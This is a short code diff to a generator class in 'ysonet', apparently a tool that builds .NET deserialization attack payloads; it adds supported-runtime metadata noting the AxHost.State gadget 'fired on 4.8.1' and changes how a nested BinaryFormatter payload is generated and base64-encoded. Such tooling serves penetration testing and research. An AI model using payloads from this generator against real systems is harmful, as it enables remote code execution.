@@ -15,7 +15,9 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.NestedDeserialization)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // AxHost.State carrier; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
         }
 
         public override string Finders()
@@ -53,7 +55,7 @@ namespace ysonet.Generators
             else
             {
                 IGenerator generator = new TextFormattingRunPropertiesGenerator();
-                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
+                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs); // we could have used AxHostStateGeneratorGadget directly here but it wouldn't have passed our other potential filters using the user input
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
